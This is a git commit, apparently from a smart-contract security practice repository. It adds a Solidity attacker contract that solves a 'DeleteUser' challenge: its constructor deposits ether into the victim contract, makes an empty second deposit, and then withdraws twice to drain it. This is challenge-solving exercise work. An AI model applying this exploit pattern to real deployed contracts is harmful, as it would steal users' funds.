9542f068b7c474b520c3c797599c7125b2fbd738
hazem-dh <hazemdhaou.it@gmail.com>
2025-07-20 21:53:28 +0200

    Solved DeleteUser

---
+++ contracts/Attacker/DeleteUserAttacker.sol
@@ -0,0 +1,21 @@
+//SPDX-License-Identifier: MIT
+
+pragma solidity 0.8.15;
+
+import "../DeleteUser.sol";
+
+contract DeleteUserAttacker {
+    DeleteUser public victimContract;
+    uint recursionCount = 0;
+
+    constructor(address _victimContract) payable {
+        // need to perform attack here since only 1 tx needed
+        victimContract = DeleteUser(_victimContract);
+        victimContract.deposit{value: msg.value}();
+        victimContract.deposit();
+        victimContract.withdraw(1);
+        victimContract.withdraw(1);
+    }
+
+    function attack() public payable {}
+}
